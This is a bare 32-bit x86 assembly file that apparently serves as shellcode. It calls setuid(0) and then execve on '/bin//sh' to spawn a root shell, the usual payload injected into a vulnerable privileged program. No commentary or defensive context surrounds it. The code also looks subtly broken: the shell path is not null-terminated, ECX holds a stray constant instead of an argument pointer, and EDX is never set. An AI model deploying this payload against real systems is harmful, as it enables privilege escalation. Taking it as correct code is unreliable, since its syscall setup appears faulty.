[BITS 32]

section .text:
global _start

_start:
push byte 23
pop eax
xor ebx, ebx

int 0x80

xor eax, eax
mov al, 11
push 0x68732f2f
push 0x6e69622f

mov ebx, esp

push 0x2a2f
pop ecx

int 0x80
